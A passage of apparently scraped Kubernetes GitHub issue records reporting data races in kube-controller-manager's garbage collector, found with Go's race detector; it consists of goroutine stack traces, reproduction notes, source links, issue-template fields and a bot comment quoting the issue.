github.com/spf13/cobra.(*Command).ExecuteC()\n          github.com/spf13/cobra@v1.10.0/command.go:1148 +0x797\n      github.com/spf13/cobra.(*Command).Execute()\n          github.com/spf13/cobra@v1.10.0/command.go:1071 +0x4d0\n      k8s.io/component-base/cli.run()\n          k8s.io/component-base/cli/run.go:146 +0x4d1\n      k8s.io/component-base/cli.Run()\n          k8s.io/component-base/cli/run.go:44 +0x3b\n      main.main()\n          k8s.io/kubernetes/cmd/kube-apiserver/apiserver.go:34 +0x24\n\n\n### What did you expect to happen?\n\nNo race.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nBuild kube-controller-manager with -race, use it in a cluster, run E2E tests.\n\nThis is automated in an experimental pull-kubernetes-e2e-kind-alpha-beta-features-race, which is how this was found with the help of a PR which automatically checks cluster logs:\n\nhttps://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/133844/pull-kubernetes-e2e-kind-alpha-beta-features-race/1973440679736512512\n\n### Anything else we need to know?\n\n/sig instrumentation\n\n\n### Kubernetes version\n\nMaster.\n\nLink to relevant source code:\n\nhttps://github.com/kubernetes/kubernetes/blob/8ac5701d3a146b367c83449d1eb6d872c003752e/staging/src/k8s.io/component-base/metrics/metric.go#L124\n\nhttps://github.com/kubernetes/kubernetes/blob/8ac5701d3a146b367c83449d1eb6d872c003752e/staging/src/k8s.io/component-base/metrics/metric.go#L130\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/instrumentation", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134371, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134371", "issue_title": "DATA RACE: garbage collector controller", "issue_author": "pohly", "issue_body": "### What happened?\n\n#### kube-system/kube-controller-manager-kind-control-plane\n\n- DATA RACE:\n  \n      Read at 0x00c004468db8 by goroutine 2240:\n        reflect.typedmemmove()\n            runtime/mbarrier.go:213 +0x0\n        reflect.packEface()\n            reflect/value.go:136 +0xab\n        reflect.valueInterface()\n            reflect/value.go:1495 +0x169\n        reflect.Value.Interface()\n            reflect/value.go:1473 +0xb4\n        fmt.(*pp).printValue()\n            fmt/print.go:769 +0xc5\n        fmt.(*pp).printValue()\n            fmt/print.go:921 +0x1325\n        fmt.(*pp).printArg()\n            fmt/print.go:759 +0xb78\n        fmt.(*pp).doPrintf()\n            fmt/print.go:1074 +0x5bc\n        fmt.Sprintf()\n            fmt/print.go:239 +0x5c\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*node).String()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph.go:213 +0xf1\n        fmt.(*pp).handleMethods()\n            fmt/print.go:673 +0x6a6\n        fmt.(*pp).printArg()\n            fmt/print.go:756 +0xb3d\n        fmt.(*pp).doPrintf()\n            fmt/print.go:1074 +0x5bc\n        fmt.Errorf()\n            fmt/errors.go:25 +0xa4\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).attemptToDeleteWorker()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:354 +0x447\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).processAttemptToDeleteWorker()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:293 +0x158\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:278 +0x47\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker-fm()\n            <autogenerated>:1 +0x21\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:278 +0x47\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker-fm()\n            <autogenerated>:1 +0x21\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x98\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n        k8s.io/apimachinery/pkg/util/wait.JitterUntilWithContext()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:223 +0x108\n        k8s.io/apimachinery/pkg/util/wait.UntilWithContext()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:172 +0x5c\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run.gowrap8()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:165 +0x17\n      \n      Previous write at 0x00c004468dbc by goroutine 1410:\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*node).markBeingDeleted()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph.go:109 +0x94\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).processGraphChanges()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:768 +0x1cd3\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).runProcessGraphChanges()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:661 +0x54\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).Run.func1()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:363 +0xe\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:233 +0x2e\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x98\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntil()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:233 +0x8a\n        k8s.io/apimachinery/pkg/util/wait.JitterUntil()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:210 +0xfb\n        k8s.io/apimachinery/pkg/util/wait.Until()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:163 +0x3bd\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).Run()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:363 +0x2ee\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run.gowrap7()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:147 +0x4f\n      \n      Goroutine 2240 (running) created at:\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:165 +0xa2a\n        k8s.io/kubernetes/cmd/kube-controller-manager/app.(*garbageCollectorController).Run.func1()\n            k8s.io/kubernetes/cmd/kube-controller-manager/app/core.go:811 +0x6a\n        k8s.io/kubernetes/cmd/kube-controller-manager/app.runFuncSlice.Run.func1()\n            k8s.io/kubernetes/cmd/kube-controller-manager/app/controller_utils.go:37 +0x9c\n      \n      Goroutine 1410 (running) created at:\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:147 +0x70c\n        k8s.io/kubernetes/cmd/kube-controller-manager/app.(*garbageCollectorController).Run.func1()\n            k8s.io/kubernetes/cmd/kube-controller-manager/app/core.go:811 +0x6a\n        k8s.io/kubernetes/cmd/kube-controller-manager/app.runFuncSlice.Run.func1()\n            k8s.io/kubernetes/cmd/kube-controller-manager/app/controller_utils.go:37 +0x9c\n\n- DATA RACE:\n  \n      Read at 0x00c004469488 by goroutine 2222:\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*node).blockingDependents()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph.go:182 +0xb8\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).processDeletingDependentsItem()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:644 +0x65\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).attemptToDeleteItem()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:536 +0x14eb\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).attemptToDeleteWorker()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:336 +0x17e\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).processAttemptToDeleteWorker()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:293 +0x158\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:278 +0x47\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker-fm()\n            <autogenerated>:1 +0x21\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:278 +0x47\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker-fm()\n            <autogenerated>:1 +0x21\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:278 +0x47\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker-fm()\n            <autogenerated>:1 +0x21\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x98\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n        k8s.io/apimachinery/pkg/util/wait.JitterUntilWithContext()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:223 +0x108\n        k8s.io/apimachinery/pkg/util/wait.UntilWithContext()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:172 +0x5c\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run.gowrap8()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:165 +0x17\n      \n      Previous write at 0x00c004469488 by goroutine 1410:\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).processGraphChanges()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:759 +0x1be4\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).runProcessGraphChanges()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:661 +0x54\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).Run.func1()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:363 +0xe\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:233 +0x2e\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x98\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n        k8s.io/apimachinery/pkg/util/wait.BackoffUntil()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:233 +0x8a\n        k8s.io/apimachinery/pkg/util/wait.JitterUntil()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:210 +0xfb\n        k8s.io/apimachinery/pkg/util/wait.Until()\n            k8s.io/apimachinery/pkg/util/wait/backoff.go:163 +0x3bd\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).Run()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:363 +0x2ee\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run.gowrap7()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:147 +0x4f\n      \n      Goroutine 2222 (running) created at:\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:165 +0xa2a\n        k8s.io/kubernetes/cmd/kube-controller-manager/app.(*garbageCollectorController).Run.func1()\n            k8s.io/kubernetes/cmd/kube-controller-manager/app/core.go:811 +0x6a\n        k8s.io/kubernetes/cmd/kube-controller-manager/app.runFuncSlice.Run.func1()\n            k8s.io/kubernetes/cmd/kube-controller-manager/app/controller_utils.go:37 +0x9c\n      \n      Goroutine 1410 (running) created at:\n        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run()\n            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:147 +0x70c\n        k8s.io/kubernetes/cmd/kube-controller-manager/app.(*garbageCollectorController).Run.func1()\n            k8s.io/kubernetes/cmd/kube-controller-manager/app/core.go:811 +0x6a\n        k8s.io/kubernetes/cmd/kube-controller-manager/app.runFuncSlice.Run.func1()\n            k8s.io/kubernetes/cmd/kube-controller-manager/app/controller_utils.go:37 +0x9c\n\n### What did you expect to happen?\n\nNo race.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nBuild kube-controller-manager with -race, use it in a cluster, run E2E tests.\n\nThis is automated in an experimental pull-kubernetes-e2e-kind-alpha-beta-features-race, which is how this was found with the help of a PR which automatically checks cluster logs:\n\nhttps://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/133844/pull-kubernetes-e2e-kind-alpha-beta-features-race/1973440679736512512\n\n### Anything else we need to know?\n\n/sig apimachinery\n\n\n### Kubernetes version\n\nMaster.\n\nLinks to relevant source code:\n\nhttps://github.com/kubernetes/kubernetes/blob/8ac5701d3a146b367c83449d1eb6d872c003752e/pkg/controller/garbagecollector/graph.go#L213\n\nhttps://github.com/kubernetes/kubernetes/blob/8ac5701d3a146b367c83449d1eb6d872c003752e/pkg/controller/garbagecollector/graph.go#L109\n\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "priority/important-soon", "sig/api-machinery", "triage/accepted"], "comments": [{"author": "k8s-ci-robot", "body": "@pohly: The label(s) `sig/apimachinery` cannot be applied, because the repository doesn't have them.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/134371):\n\n>### What happened?\n>\n>#### kube-system/kube-controller-manager-kind-control-plane\n>\n>- DATA RACE:\n>  \n>      Read at 0x00c004468db8 by goroutine 2240:\n>        reflect.typedmemmove()\n>            runtime/mbarrier.go:213 +0x0\n>        reflect.packEface()\n>            reflect/value.go:136 +0xab\n>        reflect.valueInterface()\n>            reflect/value.go:1495 +0x169\n>        reflect.Value.Interface()\n>            reflect/value.go:1473 +0xb4\n>        fmt.(*pp).printValue()\n>            fmt/print.go:769 +0xc5\n>        fmt.(*pp).printValue()\n>            fmt/print.go:921 +0x1325\n>        fmt.(*pp).printArg()\n>            fmt/print.go:759 +0xb78\n>        fmt.(*pp).doPrintf()\n>            fmt/print.go:1074 +0x5bc\n>        fmt.Sprintf()\n>            fmt/print.go:239 +0x5c\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*node).String()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph.go:213 +0xf1\n>        fmt.(*pp).handleMethods()\n>            fmt/print.go:673 +0x6a6\n>        fmt.(*pp).printArg()\n>            fmt/print.go:756 +0xb3d\n>        fmt.(*pp).doPrintf()\n>            fmt/print.go:1074 +0x5bc\n>        fmt.Errorf()\n>            fmt/errors.go:25 +0xa4\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).attemptToDeleteWorker()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:354 +0x447\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).processAttemptToDeleteWorker()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:293 +0x158\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:278 +0x47\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker-fm()\n>            <autogenerated>:1 +0x21\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:278 +0x47\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker-fm()\n>            <autogenerated>:1 +0x21\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x98\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n>        k8s.io/apimachinery/pkg/util/wait.JitterUntilWithContext()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:223 +0x108\n>        k8s.io/apimachinery/pkg/util/wait.UntilWithContext()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:172 +0x5c\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run.gowrap8()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:165 +0x17\n>      \n>      Previous write at 0x00c004468dbc by goroutine 1410:\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*node).markBeingDeleted()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph.go:109 +0x94\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).processGraphChanges()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:768 +0x1cd3\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).runProcessGraphChanges()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:661 +0x54\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).Run.func1()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:363 +0xe\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:233 +0x2e\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x98\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntil()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:233 +0x8a\n>        k8s.io/apimachinery/pkg/util/wait.JitterUntil()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:210 +0xfb\n>        k8s.io/apimachinery/pkg/util/wait.Until()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:163 +0x3bd\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).Run()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:363 +0x2ee\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run.gowrap7()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:147 +0x4f\n>      \n>      Goroutine 2240 (running) created at:\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:165 +0xa2a\n>        k8s.io/kubernetes/cmd/kube-controller-manager/app.(*garbageCollectorController).Run.func1()\n>            k8s.io/kubernetes/cmd/kube-controller-manager/app/core.go:811 +0x6a\n>        k8s.io/kubernetes/cmd/kube-controller-manager/app.runFuncSlice.Run.func1()\n>            k8s.io/kubernetes/cmd/kube-controller-manager/app/controller_utils.go:37 +0x9c\n>      \n>      Goroutine 1410 (running) created at:\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:147 +0x70c\n>        k8s.io/kubernetes/cmd/kube-controller-manager/app.(*garbageCollectorController).Run.func1()\n>            k8s.io/kubernetes/cmd/kube-controller-manager/app/core.go:811 +0x6a\n>        k8s.io/kubernetes/cmd/kube-controller-manager/app.runFuncSlice.Run.func1()\n>            k8s.io/kubernetes/cmd/kube-controller-manager/app/controller_utils.go:37 +0x9c\n>\n>- DATA RACE:\n>  \n>      Read at 0x00c004469488 by goroutine 2222:\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*node).blockingDependents()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph.go:182 +0xb8\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).processDeletingDependentsItem()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:644 +0x65\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).attemptToDeleteItem()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:536 +0x14eb\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).attemptToDeleteWorker()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:336 +0x17e\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).processAttemptToDeleteWorker()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:293 +0x158\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:278 +0x47\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker-fm()\n>            <autogenerated>:1 +0x21\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:278 +0x47\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker-fm()\n>            <autogenerated>:1 +0x21\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:278 +0x47\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).runAttemptToDeleteWorker-fm()\n>            <autogenerated>:1 +0x21\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x98\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n>        k8s.io/apimachinery/pkg/util/wait.JitterUntilWithContext()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:223 +0x108\n>        k8s.io/apimachinery/pkg/util/wait.UntilWithContext()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:172 +0x5c\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run.gowrap8()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:165 +0x17\n>      \n>      Previous write at 0x00c004469488 by goroutine 1410:\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).processGraphChanges()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:759 +0x1be4\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).runProcessGraphChanges()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:661 +0x54\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).Run.func1()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:363 +0xe\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:233 +0x2e\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x98\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n>        k8s.io/apimachinery/pkg/util/wait.BackoffUntil()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:233 +0x8a\n>        k8s.io/apimachinery/pkg/util/wait.JitterUntil()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:210 +0xfb\n>        k8s.io/apimachinery/pkg/util/wait.Until()\n>            k8s.io/apimachinery/pkg/util/wait/backoff.go:163 +0x3bd\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GraphBuilder).Run()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/graph_builder.go:363 +0x2ee\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run.gowrap7()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:147 +0x4f\n>      \n>      Goroutine 2222 (running) created at:\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:165 +0xa2a\n>        k8s.io/kubernetes/cmd/kube-controller-manager/app.(*garbageCollectorController).Run.func1()\n>            k8s.io/kubernetes/cmd/kube-controller-manager/app/core.go:811 +0x6a\n>        k8s.io/kubernetes/cmd/kube-controller-manager/app.runFuncSlice.Run.func1()\n>            k8s.io/kubernetes/cmd/kube-controller-manager/app/controller_utils.go:37 +0x9c\n>      \n>      Goroutine 1410 (running) created at:\n>        k8s.io/kubernetes/pkg/controller/garbagecollector.(*GarbageCollector).Run()\n>            k8s.io/kubernetes/pkg/controller/garbagecollector/garbagecollector.go:147 +0x70c\n>        k8s.io/kubernetes/cmd/kube-controller-manager/app.(*garbageCollectorController).Run.func1()\n>            k8s.io/kubernetes/cmd/kube-controller-manager/app/core.go:811 +0x6a\n>        k8s.io/kubernetes/cmd/kube-controller-manager/app.runFuncSlice.Run.func1()\n>            k8s.io/kubernetes/cmd/kube-controller-manager/app/controller_utils.go:37 +0x9c\n>\n>### What did you expect to happen?\n>\n>No race.\n>\n>### How can we reproduce it (as minimally and precisely as possible)?\n>\n>Build kube-controller-manager with -race, use it in a cluster, run E2E tests.\n>\n>This is automated in an experimental pull-kubernetes-e2e-kind-alpha-beta-features-race, which is how this was found with the help of a PR which automatically checks cluster logs:\n>\n>https://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/133844/pull-kubernetes-e2e-kind-alpha-beta-features-race/1973440679736512512\n>\n>### Anything else we need to know?\n>\n>/sig apimachinery\n>\n>\n>### Kubernetes version\n>\n>Master.\n>\n>Links to relevant source code:\n>\n>https://github.com/kubernetes/kubernetes/blob/8ac5701d3a146b367c83449d1eb6d872c003752e/pkg/controller/garbagecollector/graph.go#L213\n>\n>https://github.com/kubernetes/kubernetes/blob/8ac5701d3a146b367c83449d1eb6d872c003752e/pkg/controller/garbagecollector/graph.go#L109\n>\n>\n>\n>### Cloud provider\n>\n><details>\n>\n></details>\n>\n>\n>### OS version\n>\n><details>\n>\n>```console\n># On Linux:\n>$ cat /etc/os-release\n># paste output here\n>$ uname -a\n># paste output here\n>\n># On Windows:\n>C:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n># paste output here\n>```\n>\n></details>\n>\n>\n>### Install tools\n>\n><details>\n>\n></details>\n>\n>\n>### Container runtime (CRI) and version (if applicable)\n>\n><details>\n>\n></details>\n>\n>\n>### Related plugins (CNI, CSI, ...) and versions (if 